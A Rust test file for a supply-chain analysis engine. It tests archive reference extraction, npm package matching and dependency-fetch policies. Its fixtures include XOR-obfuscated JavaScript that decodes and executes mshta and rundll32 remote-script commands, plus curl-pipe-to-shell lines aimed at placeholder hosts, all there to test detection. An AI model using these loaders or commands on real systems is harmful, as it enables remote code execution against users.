use super::*;
#[test]
fn compact_archive_keeps_xor_decoded_program_targets_after_serialization() {
    use sha2::Digest;
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("commands.tar");
    let cases = [
        (
            "mshta https://program.fixturetests.net/stage.hta",
            "https://program.fixturetests.net/stage.hta",
            false,
        ),
        (
            r#"rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();GetObject("script:https://program.fixturetests.net/stage.wsf")"#,
            "https://program.fixturetests.net/stage.wsf",
            true,
        ),
    ];
    let mut archive = tar::Builder::new(std::fs::File::create(&path).unwrap());
    for (i, (command, _, loop_)) in cases.iter().enumerate() {
        let encoded: String = command.bytes().map(|b| format!("{:02x}", b ^ 81)).collect();
        let operation = if *loop_ {
            "const raw=Buffer.from(DATA,'hex');const plain=Buffer.alloc(raw.length);for(let i=0;i<raw.length;i++){plain[i]=raw[i]^KEY;}cp.exec(plain.toString('utf8'));"
        } else {
            "const line=Buffer.from(DATA,'hex').map(b=>b^KEY).toString('utf8');cp.exec(line);"
        };
        let source = format!(
            "const cp=require('child_process');const DATA='{encoded}';const KEY=81;function f(){{{operation}}}"
        );
        let mut header = tar::Header::new_ustar();
        header.set_size(source.len() as u64);
        header.set_mode(0o644);
        header.set_cksum();
        archive
            .append_data(
                &mut header,
                format!("package/command-{i}.js"),
                source.as_bytes(),
            )
            .unwrap();
    }
    archive.finish().unwrap();
    let mut report = cleave::Engine::empty()
        .with_compact_members(true)
        .analyze_file(&path, &AnalysisOptions::default())
        .unwrap();
    report.finalize();
    let report: AnalysisReport =
        serde_json::from_slice(&serde_json::to_vec(&report).unwrap()).unwrap();
    let groups = collect_references(&report, Path::new("not-on-disk"), CiRefs::Skip);
    let refs: Vec<_> = groups
        .iter()
        .flat_map(|(sha, refs)| {
            refs.iter()
                .filter(|r| r.source == "ast-batch-program")
                .map(move |r| (sha, r))
        })
        .collect();
    assert_eq!(refs.len(), 2);
    for (command, url, _) in cases {
        let sha = format!("{:x}", sha2::Sha256::digest(command.as_bytes()));
        let (owner, reference) = refs.iter().find(|(_, r)| locator(r) == url).unwrap();
        assert_eq!(owner.as_str(), sha);
        assert_eq!(reference.kind, RefKind::Dependency);
        assert_eq!(reference.offset, Some(command.find(url).unwrap() as u64));
        assert!(
            report.files.iter().any(|f| f.sha256 == sha
                && f.file_type == "batch"
                && f.path.contains("##hex+xor@"))
        );
    }
}

#[test]
fn real_compact_archive_keeps_glib_stylesheet_import_dependencies() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("theme.tar");
    let source = br#"GLib.file_set_contents(path, "@import url('https://theme.fixturetests.net/style.css');\n" + "/* local */\n");
logger.file_set_contents(path, "@import 'https://theme.fixturetests.net/logger.css';");
GLib.file_set_contents(path, unknown + "@import 'https://theme.fixturetests.net/unknown.css';");
GLib.file_set_contents(path, "status", "@import 'https://theme.fixturetests.net/ignored.css';");
"#;
    let mut archive = tar::Builder::new(std::fs::File::create(&path).unwrap());
    let mut header = tar::Header::new_ustar();
    header.set_size(source.len() as u64);
    header.set_mode(0o644);
    header.set_cksum();
    archive
        .append_data(&mut header, "extension.js", &source[..])
        .unwrap();
    archive.finish().unwrap();
    let mut report = cleave::Engine::empty()
        .with_compact_members(true)
        .analyze_file(&path, &AnalysisOptions::default())
        .unwrap();
    report.finalize();
    // Exercise the retained, serialized archive view, not a separately
    // reparsed source file that would hide compaction regressions.
    let report: AnalysisReport =
        serde_json::from_slice(&serde_json::to_vec(&report).unwrap()).unwrap();
    let groups = collect_references(&report, Path::new("not-on-disk"), CiRefs::Skip);
    let imports: Vec<_> = groups
        .iter()
        .flat_map(|(sha, refs)| {
            refs.iter()
                .filter(|r| r.source == "ast-glib-stylesheet-import")
                .map(move |r| (sha, r))
        })
        .collect();
    assert_eq!(imports.len(), 1);
    assert_eq!(
        locator(imports[0].1),
        "https://theme.fixturetests.net/style.css"
    );
    assert_eq!(imports[0].1.kind, RefKind::Dependency);
    assert_eq!(imports[0].1.offset, Some(0));
    assert!(
        report
            .files
            .iter()
            .any(|f| f.path.ends_with("!!extension.js") && &f.sha256 == imports[0].0)
    );
}

#[test]
fn real_compact_archive_retains_local_identity_entry_points_and_install_hooks() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("fixture.tar");
    let members: [(&str, &[u8]); 3] = [
            ("package-lock.json", br#"{"lockfileVersion":3,"packages":{"node_modules/tool":{"version":"1.0.0"}}}"#),
            ("node_modules/tool/package.json", br#"{"name":"tool","version":"1.0.0","main":"index.js","scripts":{"postinstall":"npm install companion@2.0.0"}}"#),
            ("node_modules/tool/index.js", b"module.exports = 7;\n"),
        ];
    let mut archive = tar::Builder::new(std::fs::File::create(&path).unwrap());
    for (name, bytes) in members {
        let mut header = tar::Header::new_ustar();
        header.set_size(bytes.len() as u64);
        header.set_mode(0o644);
        header.set_cksum();
        archive.append_data(&mut header, name, bytes).unwrap();
    }
    archive.finish().unwrap();
    let mut supplied = cleave::Engine::empty()
        .with_compact_members(true)
        .analyze_file(&path, &AnalysisOptions::default())
        .unwrap();
    supplied.finalize();
    let groups = collect_references(&supplied, &path, CiRefs::Skip);
    assert!(
        groups
            .iter()
            .flat_map(|(_, refs)| refs)
            .any(|r| locator(r) == "pkg:npm/companion@2.0.0")
    );
    let (source, references) = groups
        .iter()
        .find(|(_, refs)| refs.iter().any(|r| locator(r) == "pkg:npm/tool@1.0.0"))
        .unwrap();
    let dependency = references
        .iter()
        .find(|r| locator(r) == "pkg:npm/tool@1.0.0")
        .unwrap();
    assert!(
        LocalNpmPackages::from_report(&supplied)
            .declared_coverage(&supplied, source, dependency)
            .is_some()
    );
    let mut pass = session(
        &supplied,
        FetchPolicy {
            deps: true,
            depth: 1,
            ..FetchPolicy::default()
        },
        None,
    );
    pass.run(
        &mut supplied,
        vec![(source.clone(), vec![dependency.clone()])],
    );
    let records = pass.finish(&mut supplied).records;
    assert_eq!(records.len(), 1);
    assert!(matches!(records[0].outcome, Outcome::Skipped));
    assert!(
        records[0]
            .coverage_note
            .as_deref()
            .unwrap()
            .contains("already analyzed")
    );
}
fn reference() -> Reference {
    Reference::new(
        RefLocator::Purl("pkg:npm/tool@1.0.0".into()),
        RefKind::Dependency,
        "packages.node_modules/tool",
        "node_modules/tool",
    )
}
fn report(prefix: &str, entry: &str, code: bool) -> AnalysisReport {
    let root = format!("{prefix}/node_modules/tool");
    let mut files = vec![
        serde_json::json!({"id":0,"path":format!("{prefix}/package-lock.json"),"file_type":"package_lock_json","sha256":"source","size":1,"depth":0}),
        serde_json::json!({"id":1,"path":format!("{root}/package.json"),"file_type":"package_json","sha256":"manifest","size":1,"depth":1,
                "filefacts":{"values":{"npm":{"name":"tool","version":"1.0.0"}},"references":[{"locator":{"path":entry},"kind":"local","source":"package.json:main","evidence":entry}]}}),
    ];
    if code {
        files.push(serde_json::json!({"id":2,"path":format!("{root}/index.js"),"file_type":"javascript","sha256":"code","size":1,"depth":1}));
    }
    serde_json::from_value(serde_json::json!({"version":"3","files":files})).unwrap()
}
fn session(
    report: &AnalysisReport,
    policy: FetchPolicy,
    store: Option<Arc<pending::Store>>,
) -> FetchSession {
    static RESOURCES: OnceLock<Resources> = OnceLock::new();
    let resources = RESOURCES.get_or_init(|| Resources {
        net: Box::new(super::tests_offline::Offline),
        cache: super::tests_offline::cache(),
    });
    let mut session = FetchSession::new(report, &[], resources, Follow::quiet(policy));
    session.pending = store;
    session
}
#[test]
fn unresolved_downloader_records_survive_an_empty_worklist_and_deduplicate() {
    let script = b"curl \"$REMOTE\" | sh\n";
    let parsed = filefacts::OpenOptions::new()
        .path(Path::new("stage.sh"))
        .open(script);
    let mut report: AnalysisReport = serde_json::from_value(serde_json::json!({"version":"3","files":[
            {"id":0,"path":"root.sh","depth":0,"file_type":"shell","sha256":"a".repeat(64),"size":script.len(),"filefacts":{"symbols":parsed.symbols()}}
        ]})).unwrap();
    let mut session = session(
        &report,
        FetchPolicy::parse_follow("references").unwrap(),
        None,
    );
    session.record_unresolved_fetch_calls(&report);
    session.record_unresolved_fetch_calls(&report);
    session.run(&mut report, Vec::new());
    assert_eq!(session.out.records.len(), 1);
    assert!(session.out.records[0].content_sha256.is_none());

    // A fetched report uses this same method before its files are merged.
    let mut fetched = report.clone();
    fetched.files[0].sha256 = "b".repeat(64);
    fetched.files[0].depth = 1;
    session.record_unresolved_fetch_calls(&fetched);
    session.record_unresolved_fetch_calls(&fetched);
    assert_eq!(session.out.records.len(), 2);
    assert_eq!(session.out.records[1].source_sha256, Some("b".repeat(64)));
}

#[test]
fn unresolved_maven_declarations_survive_empty_worklists_and_deduplicate() {
    let mut report: AnalysisReport = serde_json::from_value(serde_json::json!({"version":"3","files":[
            {"id":0,"path":"app.jar","depth":0,"file_type":"jar","sha256":"a".repeat(64),"size":200,
             "filefacts":{"values":{"jar":{"pom":{"dependency_gaps":[{"member":"META-INF/maven/g/a/pom.xml","reason":"g:library: version requires unresolved property/parent/dependencyManagement/BOM"}]}}}}}
        ]})).unwrap();
    let policy = FetchPolicy::parse_follow("dependencies").unwrap();
    let mut session = session(&report, policy, None);
    session.record_unresolved_fetch_calls(&report);
    session.record_unresolved_fetch_calls(&report);
    session.run(&mut report, Vec::new());
    assert_eq!(session.out.records.len(), 1);
    let record = &session.out.records[0];
    assert_eq!(
        record.source_sha256.as_deref(),
        Some("a".repeat(64).as_str())
    );
    assert_eq!(record.kind, RefKind::Dependency);
    assert!(
        record
            .coverage_note
            .as_deref()
            .unwrap()
            .starts_with("analysis unavailable: Maven POM")
    );
    let disabled = FetchPolicy::parse_follow("none").unwrap();
    assert!(unresolved_maven_records(&report, &disabled).is_empty());
}

#[test]
fn unverified_python_candidate_and_registry_do_not_poison_the_importer() {
    let mut importer: AnalysisReport = serde_json::from_value(serde_json::json!({"version":"3","files":[
            {"id":0,"path":"entry.py","depth":0,"file_type":"python","sha256":"a".repeat(64),"size":30}
        ]})).unwrap();
    let unrelated: AnalysisReport = serde_json::from_value(serde_json::json!({"version":"3","files":[
            {"id":0,"path":"candidate.whl","depth":0,"file_type":"whl","sha256":"b".repeat(64),"size":100},
            {"id":1,"path":"candidate.whl!!unrelated/__init__.py","depth":1,"file_type":"python","sha256":"c".repeat(64),"size":20,
             "findings":[{"id":"objectives/test::hostile-candidate","crit":"hostile"}]}
        ]})).unwrap();
    let registry_report: AnalysisReport = serde_json::from_value(serde_json::json!({"version":"3","files":[
            {"id":0,"path":"candidate.registry.json","depth":0,"file_type":"registry","sha256":"d".repeat(64),"size":100,
             "findings":[{"id":"objectives/test::hostile-registry","crit":"hostile"}]}
        ]})).unwrap();
    let reference = Reference::new(
        RefLocator::Purl("pkg:pypi/scapy".into()),
        RefKind::Command,
        "ast-python-import-candidate",
        "scapy.tools.UTscapy",
    );
    let mut record = FetchRecord::terminal("pkg:pypi/scapy@1.0".into(), Outcome::Ok);
    record.kind = RefKind::Command;
    record.content_sha256 = Some("b".repeat(64));
    record.source_sha256 = Some("a".repeat(64));
    let group = GroupFetch {
        source_sha: "a".repeat(64),
        registries: vec![Gated {
            reference: reference.clone(),
            record: Registry {
                ecosystem: "pypi".into(),
                name: "scapy".into(),
                version: "1.0".into(),
                ..Default::default()
            },
            sources: None,
            provenance: None,
            skip: None,
        }],
        landed: vec![Landed {
            reference,
            record,
            standing: Standing::Analyze,
        }],
    };
    let analysis = GroupAnalysis {
        registries: vec![Some(registry_report)],
        payloads: vec![Some(Analyzed {
            content_sha: "b".repeat(64),
            sub: Some(unrelated),
            next_from_bytes: Vec::new(),
            corpus: None,
        })],
    };
    let mut pass = session(
        &importer,
        FetchPolicy::parse_follow("references").unwrap(),
        None,
    );
    let mut next = Vec::new();
    pass.merge_group(&mut importer, group, analysis, &mut next);
    assert_eq!(
        importer.files.len(),
        1,
        "neither unrelated code nor its registry claims are facts about this importer"
    );
    assert!(next.is_empty());
    assert!(pass.out.registries.is_empty());
    assert_eq!(pass.out.records.len(), 1);
    assert!(analysis_unavailable(&pass.out.records[0]));
    assert!(terminal_fetch_row_visible(&pass.out.records[0]));
    assert!(
        pass.out.records[0]
            .coverage_note
            .as_deref()
            .unwrap()
            .contains("hostile:objectives/test::hostile-candidate")
    );
    assert!(
        pass.out.records[0]
            .coverage_note
            .as_deref()
            .unwrap()
            .contains("hostile:objectives/test::hostile-registry")
    );
    assert!(
        pass.out.records[0]
            .coverage_note
            .as_deref()
            .unwrap()
            .contains("2 unique severe findings")
    );
    assert_eq!(
        fetch_row(&pass.out.records[0]).detail.as_deref(),
        Some("candidate flagged")
    );
    let attention = dependency_attention(&pass.out.records);
    assert_eq!(attention.gaps, 1);
    assert_eq!(attention.flagged_candidates, 1);
}

#[test]
fn local_matching_requires_exact_identity_version_and_code() {
    let supplied = report("bundle", "./index.js", true);
    let local = LocalNpmPackages::from_report(&supplied);
    assert_eq!(
        local
            .declared_coverage(&supplied, "source", &reference())
            .as_deref(),
        Some("bundle/node_modules/tool")
    );
    for purl in [
        "pkg:npm/tool@2.0.0",
        "pkg:npm/tool",
        "pkg:npm/other@1.0.0",
        "pkg:pypi/tool@1.0.0",
    ] {
        let mut r = reference();
        r.locator = RefLocator::Purl(purl.into());
        assert!(
            local.declared_coverage(&supplied, "source", &r).is_none(),
            "{purl}"
        );
    }
    for (entry, code) in [
        ("./index.js", false),
        ("../index.js", true),
        ("./missing.js", true),
    ] {
        let supplied = report("bundle", entry, code);
        assert!(
            LocalNpmPackages::from_report(&supplied)
                .declared_coverage(&supplied, "source", &reference())
                .is_none()
        );
    }
}
#[test]
fn local_matching_never_borrows_sibling_or_shadowed_installations() {
    let mut supplied = report("bundle/other", "index.js", true);
    supplied.files[0].path = "bundle/app/package-lock.json".into();
    assert!(
        LocalNpmPackages::from_report(&supplied)
            .declared_coverage(&supplied, "source", &reference())
            .is_none()
    );
    supplied = report("bundle", "index.js", true);
    supplied.files[0].path = "bundle/app/package.json".into();
    let shadow: cleave::types::FileAnalysis = serde_json::from_value(serde_json::json!({"id":3,"path":"bundle/app/node_modules/tool/package.json","file_type":"package_json","sha256":"shadow","size":1,"depth":1})).unwrap();
    supplied.files.push(shadow);
    assert!(
        LocalNpmPackages::from_report(&supplied)
            .declared_coverage(&supplied, "source", &reference())
            .is_none()
    );
}
#[test]
fn archive_root_installation_resolves_without_crossing_archive_boundary() {
    let mut supplied = report("placeholder", "index.js", true);
    for file in &mut supplied.files {
        file.path = file.path.replace("placeholder/", "bundle.tar!!");
    }
    assert_eq!(
        LocalNpmPackages::from_report(&supplied)
            .declared_coverage(&supplied, "source", &reference())
            .as_deref(),
        Some("bundle.tar!!node_modules/tool")
    );
    supplied.files[0].path = "other.tar!!package-lock.json".into();
    assert!(
        LocalNpmPackages::from_report(&supplied)
            .declared_coverage(&supplied, "source", &reference())
            .is_none()
    );
}
#[test]
fn local_matching_respects_alias_install_paths_and_incomplete_code() {
    let mut supplied = report("archive.tar!!bundle", "index.js", true);
    supplied.files[1].path = supplied.files[1]
        .path
        .replace("node_modules/tool", "node_modules/alias");
    supplied.files[2].path = supplied.files[2]
        .path
        .replace("node_modules/tool", "node_modules/alias");
    let mut r = reference();
    r.context = Some(filefacts::DependencyContext {
        scope: filefacts::DependencyScope::Runtime,
        optional: false,
        has_install_script: false,
        installed_path: Some("node_modules/alias".into()),
    });
    assert!(
        LocalNpmPackages::from_report(&supplied)
            .declared_coverage(&supplied, "source", &r)
            .is_some()
    );
    supplied.files[2]
        .analysis_gaps
        .record(cleave::types::AnalysisGap::SourceParseIncomplete);
    assert!(
        LocalNpmPackages::from_report(&supplied)
            .declared_coverage(&supplied, "source", &r)
            .is_none()
    );
}
#[test]
fn supplied_unpinned_code_is_recorded_without_claiming_integrity() {
    let mut supplied = report("bundle", "index.js", true);
    let mut pass = session(
        &supplied,
        FetchPolicy {
            deps: true,
            depth: 1,
            ..FetchPolicy::default()
        },
        None,
    );
    pass.run(&mut supplied, vec![("source".into(), vec![reference()])]);
    let records = pass.finish(&mut supplied).records;
    assert_eq!(records.len(), 1);
    assert!(matches!(records[0].outcome, Outcome::Skipped));
    assert!(records[0].pin_verified.is_none());
    assert!(records[0].content_sha256.is_none());
    assert!(
        records[0]
            .coverage_note
            .as_deref()
            .unwrap()
            .contains("already analyzed")
    );
}
#[test]
fn development_scope_does_not_outrank_runtime_unless_it_executes_hooks() {
    let runtime = reference();
    let mut dev = reference();
    dev.context = Some(filefacts::DependencyContext {
        scope: filefacts::DependencyScope::Development,
        optional: false,
        has_install_script: false,
        installed_path: None,
    });
    assert!(dependency_execution_priority(&runtime) < dependency_execution_priority(&dev));
    dev.context.as_mut().unwrap().has_install_script = true;
    assert!(dependency_execution_priority(&dev) < dependency_execution_priority(&runtime));
    let supplied = report("bundle", "missing.js", false);
    let mut pass = session(
        &supplied,
        FetchPolicy {
            deps: true,
            include_dev_dependencies: false,
            ..FetchPolicy::default()
        },
        None,
    );
    assert!(pass.select("source", vec![dev], 0, &mut 0).is_empty());
    assert!(
        pass.out.records[0]
            .coverage_note
            .as_deref()
            .unwrap()
            .contains("development-only")
    );
}
#[test]
fn resumed_work_keeps_depth_pins_and_source_and_does_not_bypass_ci_scope() {
    let dir = tempfile::tempdir().unwrap();
    let store = Arc::new(pending::Store::open(&dir.path().join("queue")).unwrap());
    let mut supplied = report("bundle", "missing.js", false);
    let mut r = Reference::new(
        RefLocator::Url("http://stage.example.test/stage.sh".into()),
        RefKind::Command,
        "shell",
        "curl http://stage.example.test/stage.sh | sh",
    );
    r.offset = Some(17);
    r.pinned_hash = Some(filefacts::PinnedHash {
        algo: filefacts::HashAlgo::Sha256,
        value: "a".repeat(64),
    });
    let entry = pending::Entry {
        root_sha: "source".into(),
        source_sha: "original-parent".into(),
        hop: 3,
        reference: r.clone(),
        reason: "depth limit".into(),
        redirect_credit: 0,
    };
    store.update(std::slice::from_ref(&entry), &[]).unwrap();
    let mut pass = session(
        &supplied,
        FetchPolicy {
            urls: true,
            packages: true,
            depth: 2,
            ..FetchPolicy::default()
        },
        Some(store.clone()),
    );
    pass.run(&mut supplied, vec![]);
    assert!(!pass.out.records.is_empty());
    assert!(
        pass.out.records[0]
            .coverage_note
            .as_deref()
            .unwrap()
            .contains("hop=3")
    );
    let saved = store.entries("source").unwrap();
    assert_eq!(saved.len(), 1);
    assert_eq!(saved[0].reference, r);
    // Widening depth tries the same URL; the offline transport refuses it.
    let mut pass = session(
        &supplied,
        FetchPolicy {
            urls: true,
            packages: true,
            depth: 4,
            ..FetchPolicy::default()
        },
        Some(store.clone()),
    );
    pass.run(&mut supplied, vec![]);
    assert_eq!(
        pass.out.records[0].source_sha256.as_deref(),
        Some("original-parent")
    );
    assert_eq!(pass.out.records[0].source_offset, Some(17));
    assert!(matches!(
        pass.out.records[0].outcome,
        Outcome::Failed(FetchError::Refused(_))
    ));
    assert!(store.entries("source").unwrap().is_empty());
    r.context = Some(filefacts::DependencyContext {
        scope: filefacts::DependencyScope::Ci,
        optional: false,
        has_install_script: false,
        installed_path: None,
    });
    store
        .update(
            &[pending::Entry {
                reference: r,
                hop: 0,
                ..entry
            }],
            &[],
        )
        .unwrap();
    let mut pass = session(
        &supplied,
        FetchPolicy {
            urls: true,
            packages: true,
            ci: false,
            ..FetchPolicy::default()
        },
        Some(store.clone()),
    );
    pass.run(&mut supplied, vec![]);
    assert!(pass.out.records.is_empty());
    assert_eq!(store.entries("source").unwrap().len(), 1);
}
#[test]
fn timeout_defers_unvisited_references_and_keeps_integrity() {
    let dir = tempfile::tempdir().unwrap();
    let store = Arc::new(pending::Store::open(&dir.path().join("queue")).unwrap());
    let mut supplied = report("bundle", "index.js", true);
    let mut r = reference();
    r.pinned_hash = Some(filefacts::PinnedHash {
        algo: filefacts::HashAlgo::Sha512,
        value: "PIN".into(),
    });
    let mut pass = session(
        &supplied,
        FetchPolicy {
            deps: true,
            ..FetchPolicy::default()
        },
        Some(store.clone()),
    );
    pass.deadline.at = Some(Instant::now());
    pass.run(&mut supplied, vec![("source".into(), vec![r.clone()])]);
    assert!(
        pass.out.records[0]
            .coverage_note
            .as_deref()
            .unwrap()
            .contains("fetch timeout")
    );
    assert_eq!(store.entries("source").unwrap()[0].reference, r);
}
#[test]
fn conflicting_pins_have_distinct_fetch_work_keys() {
    let mut first = reference();
    first.pinned_hash = Some(filefacts::PinnedHash {
        algo: filefacts::HashAlgo::Sha512,
        value: "ONE".into(),
    });
    let mut second = first.clone();
    second.pinned_hash.as_mut().unwrap().value = "TWO".into();
    assert_ne!(fetch_work_key(&first), fetch_work_key(&second));
}
